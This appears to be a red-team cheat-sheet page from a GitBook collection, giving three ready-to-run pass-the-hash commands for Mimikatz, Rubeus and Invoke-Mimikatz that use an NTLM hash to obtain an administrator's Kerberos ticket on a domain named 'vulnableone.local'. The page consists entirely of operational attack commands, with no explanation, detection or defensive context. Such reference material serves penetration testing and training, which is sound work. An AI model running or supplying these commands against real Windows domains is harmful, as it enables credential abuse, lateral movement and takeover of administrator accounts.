---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/defense-evasion/use-alternate-authentication-material/pass-the-hash
---

# Pass The Hash

{% code overflow="wrap" %}
```powershell
# Mimikatz
mimikatz.exe "sekurlsa::pth /user:admin /domain:vulnableone.local /ntlm:f31d3eabdce2e158d923ddec72d4979d /ptt" "exit" 

# Rubeus
Rubeus_PTH.exe asktgt /domain:vulnableone.local /user:administrator /rc4:f31d3eabdce2e158d923ddec72d4979d /ptt

# Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /ntlm:f31d3eabdce2e158d923ddec72d4979d /domain:vulnableone.local /ptt"'
```
{% endcode %}
